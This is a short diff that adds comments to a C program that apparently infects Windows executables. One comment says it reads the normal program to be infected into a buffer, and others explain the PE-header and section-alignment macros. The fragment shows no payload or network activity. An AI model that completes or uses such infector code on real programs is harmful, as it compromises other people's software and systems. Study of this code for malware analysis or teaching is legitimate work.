@@ -40,13 +40,17 @@ int main(int argc, char** argv) {
 	}
 
 	char* buff; DWORD fileSize;
+	// 把欲感染的正常程式內容存入 buff
 	if (!readBinFile(argv[1], &buff, fileSize)) {
 		puts("[!] selected file not found.");
 		return 0;
 	}
 
+// get pointer of NT Headers
 #define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew))
+// get entry of section headers
 #define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))
+// padding
 #define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))
 
 	puts("[+] malloc memory for outputed *.exe file.");
